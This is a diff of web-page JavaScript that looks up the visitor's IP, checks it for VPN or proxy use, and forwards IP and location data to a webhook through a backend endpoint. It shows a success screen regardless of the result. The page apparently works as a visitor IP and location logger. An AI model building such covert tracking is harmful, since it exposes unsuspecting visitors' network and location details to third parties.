@@ -641,37 +641,68 @@
       const ip = ipJson.ip;
 
       // 2) Check VPN/proxy using your server-side endpoint (with timeout)
-      // If server returns vpn:true -> show alert (VPN detected)
-      // tolerant ipcheck fetch: ipcheck may return 502 with JSON { allKeysFailed: true }
+      // We must tolerate non-OK status codes (e.g. 502) and still read JSON body.
       let vpnData = null;
       try {
-        // try the timeout-aware fetch first (fast success path)
+        // primary attempt: timeout-aware fetch (fast success path)
         const vpnRes = await fetchWithTimeout("/api/ipcheck?ip=" + encodeURIComponent(ip), {}, DEFAULT_TIMEOUT);
-        vpnData = await vpnRes.json();
-      } catch (e) {
-        // If fetchWithTimeout threw due to non-OK HTTP status (e.g. 502),
-        // fallback to a plain fetch so we can still read the JSON body and act on allKeysFailed.
-        // Re-throw for other failure modes (network offline / timeout / real errors).
-        const msg = (e && e.message) ? e.message.toLowerCase() : "";
-        const looksLikeHttp = msg.startsWith('http') || msg.includes('http');
-        if (looksLikeHttp) {
+        try {
+          vpnData = await vpnRes.json();
+        } catch (parseErr) {
+          console.warn('ipcheck: failed to parse JSON from fetchWithTimeout response', parseErr);
+          vpnData = null;
+        }
+      } catch (firstErr) {
+        // fetchWithTimeout threw — could be non-OK (we throw for non-ok), timeout, or network.
+        console.warn('fetchWithTimeout for /api/ipcheck failed:', firstErr);
+
+        // If it was a network/timeout/offline problem, rethrow so outer catch handles it.
+        // We detect timeout/offline by checking common error names/messages.
+        const errMsg = (firstErr && firstErr.message) ? firstErr.message.toLowerCase() : '';
+        const looksLikeNetwork = errMsg.includes('timeout') || errMsg.includes('offline') || errMsg.includes('failed to fetch');
+
+        if (looksLikeNetwork) {
+          // rethrow to be handled by outer try/catch (shows alert)
+          throw firstErr;
+        }
+
+        // Otherwise, fallback to plain fetch to try to read the response body even if server returned 502/500.
+        try {
+          const raw = await fetch("/api/ipcheck?ip=" + encodeURIComponent(ip));
           try {
-            const raw = await fetch("/api/ipcheck?ip=" + encodeURIComponent(ip));
-            // attempt to parse the JSON response even on non-OK
-            vpnData = await raw.json().catch(() => null);
-          } catch (inner) {
-            // couldn't even read the fallback response — rethrow original so outer catch handles it.
-            throw e;
+            vpnData = await raw.json();
+          } catch (parseErr2) {
+            console.warn('ipcheck: failed to parse JSON from plain fetch response', parseErr2);
+            vpnData = null;
           }
-        } else {
-          // rethrow for timeouts/offline/other errors so outer catch shows alert as before
-          throw e;
+        } catch (plainFetchErr) {
+          console.error('Plain fetch for /api/ipcheck also failed:', plainFetchErr);
+          // Re-throw the original error so outer catch shows alert.
+          throw firstErr;
         }
       }
 
-      // If ipcheck returned allKeysFailed -> send special error payload (per your request)
+      // If we still have no vpnData (no JSON), treat it as an "all keys failed" fallback and forward an error payload.
+      if (!vpnData) {
+        console.warn('ipcheck returned no usable JSON; forwarding minimal error payload to webhook and showing success UI.');
+        const errorPayload = { status: "error", location: false };
+        try {
+          await fetchWithTimeout("/api/send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ webhook, data: errorPayload })
+          }, DEFAULT_TIMEOUT);
+        } catch (sendErr) {
+          console.error('Failed to forward fallback error payload to /api/send:', sendErr);
+          // If forwarding fails, bubble up so user sees alert (network problem)
+          throw sendErr;
+        }
+        showSuccess();
+        return;
+      }
+
+      // If ipcheck explicitly flagged that all API keys failed, forward the special payload (your original behavior)
       if (vpnData.allKeysFailed) {
-        // ipInfo may be provided by ipcheck in vpnData.ipInfo (from ipwho.is)
         const ipInfoFrom = vpnData.ipInfo || null;
         const hasLocation = !!(ipInfoFrom && (ipInfoFrom.country || ipInfoFrom.city || ipInfoFrom.region));
         const errorPayload = {
@@ -680,21 +711,18 @@
         };
         if (hasLocation) errorPayload.ipData = ipInfoFrom;
 
-        // send to your backend which forwards to the webhook URL (with timeout)
         await fetchWithTimeout("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ webhook, data: errorPayload })
         }, DEFAULT_TIMEOUT);
 
-        // success UI (we still show success because request forwarded)
         showSuccess();
         return;
       }
 
       // Determine vpn/proxy from ipcheck response (isproxyip returns { status: 'success', proxy: 0|1 })
       const vpnOn = (typeof vpnData.proxy !== 'undefined') ? (vpnData.proxy === 1) : !!vpnData.vpn;
-
       if (vpnOn) {
         document.getElementById("loader").style.display = "none";
         content.classList.remove("blurred");
